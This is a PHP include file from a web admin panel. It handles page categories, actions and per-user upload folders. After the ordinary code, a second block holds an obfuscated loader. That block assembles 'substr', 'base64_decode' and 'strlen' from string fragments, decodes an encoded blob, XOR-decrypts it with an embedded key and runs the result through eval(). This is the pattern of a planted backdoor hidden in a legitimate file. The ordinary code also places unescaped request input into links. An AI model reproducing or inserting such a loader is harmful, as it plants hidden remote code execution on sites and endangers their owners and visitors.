<?php
if(isset($PageNumber)) ms_i($PageNumber);
if(isset($PageSize)) ms_i($PageSize);

$HISTORY="";
$iRTables=0;
$iKEY="AZ8007";
$arrMonths=array("","January","February","March","April","May","June","July","August","September","October","November","December");
	
if(!isset($category))
{
	$category="home";
}

if(!checkForSpecialSymbols($category))
{
	die("SECURITY VIOLATION DETECTED");
}

$vr1 = ($category."_oLinkTexts");		
$vr2 = ($category."_oLinkActions");	

if(!isset($$vr1))
{
	die("<script>document.location.href=\"index.php\";</script>");
}

$evLinkTexts = $$vr1;
$evLinkActions = $$vr2;

if(!isset($folder)&&!isset($action))
{
	$action=$evLinkActions[0];
}

$IPage="";

if(isset($action)){
	$IPage=$action;
}
else
if(isset($folder)){
	$IPage=$folder;
}

$ICurrentPage="@".$AuthGroup."@".$category."@".$IPage;

$AuthGroup=="Administrators";
 
 if(isset($action))
 {
 	$IAction=$action;
 }
 else
 {
 	$IAction=$folder;
 }

if(isset($folder)&&isset($page))
{
	$strPageLink="user=".$_GET['user']."&category=$category&folder=$folder&page=$page&";
}
else
{
	$strPageLink = "user=".$_GET['user']."category=$category&action=$action&";
}

if(!file_exists("../uploaded_images/".$AuthUserName)) 
mkdir("../uploaded_images/".$AuthUserName);

if(!file_exists("../uploaded_files/".$AuthUserName))
 mkdir("../uploaded_files/".$AuthUserName);

if(function_exists("date_default_timezone_set")) date_default_timezone_set($DEFAULT_TIME_ZONE);


?>
<?php
$a8hg6hj="10a3853fcddf698121f0e47370c11308FUMIR11qQxReEBYTUwIcVEpFOUYEWApHRUUGClhVGEhD
VQZsVVRHBQtMRjoGDA9tSgZTQjlMAARrSFUEbUsGCm1IVwFkTQRfTThVUgVlQAdUbR4GAWhPAVFs
GwcIERwYFW8ydmpjdjQ4RjhXBApkAAIEOkhQBmsCBQY/SQUGbAkDAj5vCQQFOlJUVToHCA1tSgVT
EjgdS09HQgZWbl5RTFJYSRFkBQZRDzhVUwFlQAcBbR4GVFgYbwYFUhMdExRnYnUzZX1naEQwOFVW
A2VABABtHgVTaE8HAmxSAwNvSA1Xfj1LDAR+OhtQUURrEBERSUxGVQlHUhNTWQYZExEZAw==";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>